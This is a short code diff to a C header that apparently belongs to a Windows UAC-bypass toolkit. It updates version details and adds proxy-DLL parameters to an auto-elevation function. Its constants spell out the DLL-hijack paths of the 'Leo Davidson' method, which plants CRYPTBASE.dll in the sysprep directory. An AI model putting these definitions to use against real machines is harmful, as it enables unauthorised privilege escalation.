@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.H
 *
-*  VERSION:     1.10
+*  VERSION:     1.20
 *
-*  DATE:        27 Mar 2015
+*  DATE:        29 Mar 2015
 *
 *  Prototypes and definitions for Leo Davidson method.
 *
@@ -18,7 +18,7 @@
 *******************************************************************************/
 
 //
-// Standard elevation methods (Carberp "ehome" method ignored as out-dated).
+// Standard elevation methods.
 //
 #define M1W7_SOURCEDLL			L"%temp%\\CRYPTBASE.dll"
 #define M1W7_TARGETDIR			L"%systemroot%\\system32\\sysprep\\"
@@ -29,5 +29,7 @@
 #define M1WALL_TARGETPROCESS	L"%systemroot%\\system32\\oobe\\setupsqm.exe"
 
 BOOL ucmStandardAutoElevation(
-	DWORD dwType
+	DWORD dwType,
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
 	);
